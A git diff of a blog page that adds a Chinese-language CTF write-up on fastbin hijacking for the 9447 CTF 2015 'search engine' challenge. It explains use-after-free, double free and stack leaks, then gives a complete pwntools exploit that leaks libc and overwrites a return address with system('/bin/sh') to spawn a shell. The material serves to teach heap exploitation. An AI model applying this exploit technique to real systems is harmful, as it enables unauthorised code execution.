@@ -50,7 +50,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -83,12 +83,51 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>hello!!!!</p>
+        <h1 id="fastbin-劫持"><a href="#fastbin-劫持" class="headerlink" title="fastbin 劫持"></a>fastbin 劫持</h1><p>最近在看GitHub上的<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">how2heap</a> ，专门讲针对堆的攻击方法。本篇是看了fastbin_dup_into_stack.c和对应的题目9447 ctf 2015 search engine进行的总结。</p>
+<p>在看fastbin_dup_into_stack.c时我还不太清楚将fastbin劫持到栈中能起到什么作用，看了search engine明白了，劫持到栈中是为了直接覆写返回地址，执行shell。</p>
+<p>[TOC]</p>
+<h2 id="1-fastbin劫持的原理"><a href="#1-fastbin劫持的原理" class="headerlink" title="1.fastbin劫持的原理"></a>1.fastbin劫持的原理</h2><p>fastbin劫持的原理是，在双重释放之后，fastbin上会有两个相同的chunk，当其中一个chunk被分配并能够进行写操作时，另一个留在fastbin链表里的chunk对应的内容也会发生改变，通过覆写FD指针，将链表中的下一个结点指向我们可以操控的地方。需要注意的是，fastbin再分配之前会先检查当前这个chunk的大小是否与申请的大小一致，因此伪造的fastbin chunk的size字段必须满足条件。</p>
+<p><img src="/2018/06/05/search/fastbin_1.png" alt=""></p>
+<p><img src="/2018/06/05/search/fastbin_2.png" alt="fastbin attack"></p>
+<p>了解了原理之后再看search engine这道题。</p>
+<h2 id="2-search-engine"><a href="#2-search-engine" class="headerlink" title="2.search engine"></a>2.search engine</h2><h3 id="1-基本逻辑"><a href="#1-基本逻辑" class="headerlink" title="1) 基本逻辑"></a>1) 基本逻辑</h3><p>一个简单的搜索引擎，index  a  sentence输入一个句子，单词用空格作为分隔，每个单词放入一个结点中，记录单词的地址、大小以及所在句子的地址、大小，最后一个字段记录下一个结点的地址。单词链表类似于一个栈的结构，最后分隔的单词在链表的最顶端。一个node结点占40字节。</p>
+<p><img src="/2018/06/05/search/menu.png" alt="menu"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> * word;         <span class="comment">//8 bytes</span></span><br><span class="line">    <span class="keyword">int</span> word_size;       <span class="comment">//4 bytes</span></span><br><span class="line">    <span class="keyword">int</span> word_padding;    <span class="comment">//4 bytes</span></span><br><span class="line">    <span class="keyword">char</span> * sentence;     <span class="comment">//8 bytes</span></span><br><span class="line">    <span class="keyword">int</span> sentence_size;   <span class="comment">//4 bytes</span></span><br><span class="line">    <span class="keyword">int</span> sentence_padding;<span class="comment">//4 bytes</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> *<span class="title">next</span>;</span>		 <span class="comment">//8 bytes</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>search with a word输入一个单词，从链表的头部开始查找相同单词，找到之后将对应的sentence置为0，并free sentence指针所指空间。</p>
+<h3 id="2-漏洞"><a href="#2-漏洞" class="headerlink" title="2) 漏洞"></a>2) 漏洞</h3><p>本题共有两个漏洞：</p>
+<p>第二个漏洞我确实没看出来，大概是不细心&amp;平时我也是这么写的= =</p>
+<ul>
+<li>释放sentence之后对应指针没有置零，UAF漏洞和double-free漏洞。</li>
+</ul>
+<ul>
+<li><p>input_num函数可以泄露栈中的内容。strtol函数的第二个参数endptr返回的是字符串中不能转换为数字的地址，当输入的首个字符就不能转换为数字时，即&amp;nptr == endptr，input_num就会将输入的字符串打印出来。当输入的字符数量为48时，input_str不会向结尾加入NULL，由此可以读出字符串之后栈中的内容。</p>
+<p>​</p>
+</li>
+</ul>
+<h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3) 漏洞利用"></a>3) 漏洞利用</h3><p>有了以上两个漏洞，再结合fastbin_dup_into_stack.c来看，我们需要<strong>泄露栈中地址</strong>，<strong>泄露libc地址</strong>（进而泄露system地址），将<strong>system函数写入栈中的返回地址处</strong>，执行system函数。</p>
+<p><strong>泄露栈地址</strong>（这个真的不是玄学吗？？）</p>
+<p>input_num函数是递归调用的，第一次输入48个字节后面没有其他东西，但是继续输入48个字节就有机会泄露栈中内容，即通过向上增长栈寻找可泄露的地址。</p>
+<p><img src="/2018/06/05/search/leak_stack.png" alt="两次输入48字节"></p>
+<p>通过多次gdb的调试，发现泄露的内容是一个栈地址，但是<em>我到现在还是不太明白，为什么这个栈地址加上某一偏移的地址其值能一直保持不变化</em>。这里打一个问号。看别人的题解说，这里距离返回地址的位置比较近，可以确定的是，调用index sentence和 search word函数的返回地址都是0x400d60- 0x400e24范围内的，且压入返回地址的位置永恒不变，可以确定通过泄露的栈地址计算返回地址的栈地址，但是如何定位到含有“0x40”的地址，还没有搞清楚。</p>
+<p><img src="/2018/06/05/search/leak_stack_2.png" alt=""></p>
+<p><strong>泄露libc地址</strong></p>
+<p>UAF漏洞可以达到这个目的。试想如果sentence（简称s1）的大小与一个node一样，都是40 bytes，那么当释放s1空间后，再输入一个新的sentence（简称s2，保证大小不是32-40字节，防止将刚释放的s1分配给它），这时会建立一个新的node（简称n2）存放word信息，就会将刚释放的s1的空间分配给n2，而且也能保证s1空间不再为NULL，绕过了对内容是否为空的检查：*（node + 16）！=NULL。</p>
+<p>由于s1释放之后没有把指针置空，导致原来的node的word和sentence指针仍指向原来的位置，通过search并删除s1，使 n2 引用的是已释放的空间。</p>
+<p>继续把已经释放的s1分配给新的sentence（简称s3），并通过向s3里写内容，伪造一个假的node结点，使其中sentence指针指向puts@got，这样在search成功之后，就会输出puts@got中的puts地址，从而泄露libc地址。</p>
+<p><strong>system函数覆盖栈中返回地址</strong></p>
+<p>按照其他大佬的思路，在泄露的栈地址之后找到了0x40用于表示chunk_size的地址，且距离返回地址较近，接下来就可以通过fastbin劫持将fastbin链表结点指向这个栈中地址。</p>
+<p>为了配合0x40这个大小，可以新建两个0x40长度的sentence a和b，按照程序逻辑b对应的node结点将会在word链表的顶端。</p>
+<p>然后通过search删除它们，fastbin中的结构如下: fastbin -&gt; a-&gt;b-&gt;NULL，由于node中的指针并没有置零，因此search的时候还会去检查已经释放的a和b空间是否符合条件。</p>
+<p>search（’\x00’），先从word的顶端b对应的node开始检查，由于b中的FD指针为NULL，它不能通过<em>（node + 16）！=NULL 的检测，接着来到a对应的node，即使node能够满足条件，但是<em>*由于a是fastbin中的第一个chunk，释放它将会引发错误。</em></em>因此我们可以在最开始时候新建3个sentence a,b,c。这样fastbin中就是：fastbin -&gt;a -&gt;b -&gt; c -&gt; NULL ，然后再search(‘\00’)，删除掉b保留a，达到双重释放的目的，fastbin结构变成：fastbin -&gt;b -&gt;a -&gt;b -&gt;……</p>
+<p>释放之后，再申请相同大小的sentence导致b空间被分配，并通过改写b从而改掉处于fastbin中b的FD指针，使其指向栈中假的chunk。</p>
+<p>接着把剩余的a和b再分配出去，再申请sentence将会返回栈中的假chunk，以写sentence的内容覆写返回地址。</p>
+<h3 id="4）exp"><a href="#4）exp" class="headerlink" title="4）exp"></a>4）exp</h3><p>（栈中偏移地址部分参考了其他<a href="https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/" target="_blank" rel="noopener">大佬</a>的数据，整体思路也是顺着这位大佬来的）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./search"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Quit\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"a"</span>*<span class="number">48</span>)</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line">	p.sendline(<span class="string">"b"</span>*<span class="number">48</span>)</span><br><span class="line">	leak = p.recvline().split(<span class="string">' '</span>)[<span class="number">0</span>][<span class="number">48</span>:]</span><br><span class="line">    	<span class="keyword">return</span> int(leak[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(sentence)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Quit\n")</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the sentence size:\n"</span>)</span><br><span class="line">	p.sendline(str(len(sentence)))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the sentence:\n"</span>)</span><br><span class="line">	p.sendline(sentence)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(word)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Quit\n"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the word size:\n"</span>)</span><br><span class="line">	p.sendline(str(len(word)))</span><br><span class="line">	p.recvuntil(<span class="string">"Enter the word:\n"</span>)</span><br><span class="line">	p.sendline(word)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">	sentence = <span class="string">'a'</span>*<span class="number">12</span> + <span class="string">' b '</span></span><br><span class="line">	sentence = sentence.ljust(<span class="number">40</span>,<span class="string">'c'</span>)</span><br><span class="line">	index(sentence)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#delete s1</span></span><br><span class="line">	search(<span class="string">'b'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#n4 use s1</span></span><br><span class="line">	index(<span class="string">'d'</span>*<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#delete s1,but n4 still can use it=&gt;UAF</span></span><br><span class="line">	search(<span class="string">'\x00'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#a new sentence share space with n4</span></span><br><span class="line">	puts_got = <span class="number">0x602028</span></span><br><span class="line">	node =p64(<span class="number">0x400E90</span>) <span class="comment">#"Enter"</span></span><br><span class="line">	node += p64(<span class="number">5</span>)</span><br><span class="line">	node += p64(puts_got)</span><br><span class="line">	node += p64(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">	index(node)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#search 'Enter' to leak puts_address</span></span><br><span class="line">	search(<span class="string">'Enter'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Found 64: "</span>)</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"###puts_addr:0x%x"</span> %puts_addr</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> puts_addr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overwrite_retn</span><span class="params">()</span>:</span></span><br><span class="line">	index(<span class="string">'a'</span>*<span class="number">54</span>+<span class="string">' d'</span>)</span><br><span class="line">	index(<span class="string">'b'</span>*<span class="number">54</span>+<span class="string">' d'</span>)</span><br><span class="line">	index(<span class="string">'c'</span>*<span class="number">54</span>+<span class="string">' d'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">	search(<span class="string">'d'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># b-&gt;a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">	search(<span class="string">'\x00'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'y'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Delete this sentence (y/n)?"</span>)</span><br><span class="line">	p.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># fake fastbin</span></span><br><span class="line">	index(p64(stack_addr).ljust(<span class="number">56</span>,<span class="string">'e'</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># malloc a and b</span></span><br><span class="line">	index(<span class="string">'f'</span>*<span class="number">56</span>)</span><br><span class="line">	index(<span class="string">'g'</span>*<span class="number">56</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># overwrite the ret address with gadget</span></span><br><span class="line">	pop_ret = <span class="number">0x400e23</span></span><br><span class="line">	sentence = <span class="string">'A'</span>*<span class="number">30</span></span><br><span class="line">	sentence += p64(pop_ret)</span><br><span class="line">	sentence += p64(binsh_addr)</span><br><span class="line">	sentence += p64(system_addr)</span><br><span class="line"></span><br><span class="line">	index(sentence)</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="comment">#leak stack address</span></span><br><span class="line">stack_leak = leak_stack()</span><br><span class="line">stack_addr = stack_leak + <span class="number">0x22</span> - <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc address</span></span><br><span class="line">puts_addr = leak_libc()</span><br><span class="line">libc = ELF(<span class="string">'libc.so'</span>)</span><br><span class="line">system_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">binsh_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#double free to edit the retn address in stack</span></span><br><span class="line">overwrite_retn()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/06/05/search/" data-id="cji1t7ugh00032gu6qbadkimo" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/06/05/search/" data-id="cji1tb6uw0006psu6rw3fsm8w" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -160,7 +199,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/13/unsortedbin-attack-0ctf-zerostorage/" data-id="cji1t7ugh00042gu6y6uyq7nv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/03/13/unsortedbin-attack-0ctf-zerostorage/" data-id="cji1tb6ug0003psu6o0hskzv9" class="article-share-link">Teilen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn-how2heap/">pwn how2heap</a></li></ul>
@@ -219,7 +258,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/08/pwnable-tw-silver-bullet/" data-id="cji1t7ug200012gu6pgowxpp3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/03/08/pwnable-tw-silver-bullet/" data-id="cji1tb6ug0002psu62j43shl8" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -273,7 +312,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/08/pwnable-tw-hacknote/" data-id="cji1t7ugh00022gu64chgur80" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/03/08/pwnable-tw-hacknote/" data-id="cji1tb6u10000psu6l8awx1rk" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -395,7 +434,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/02/07/HITCTF-PWN/" data-id="cji1t7ug200002gu6o99icbwt" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/02/07/HITCTF-PWN/" data-id="cji1tb6ug0001psu6xpj3loti" class="article-share-link">Teilen</a>
       
       
     </footer>
@@ -435,7 +474,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
+    <h3 class="widget-title">Archiv</h3>
     <div class="widget">
       <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li></ul>
     </div>
@@ -445,7 +484,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">letzter Beitrag</h3>
     <div class="widget">
       <ul>
         
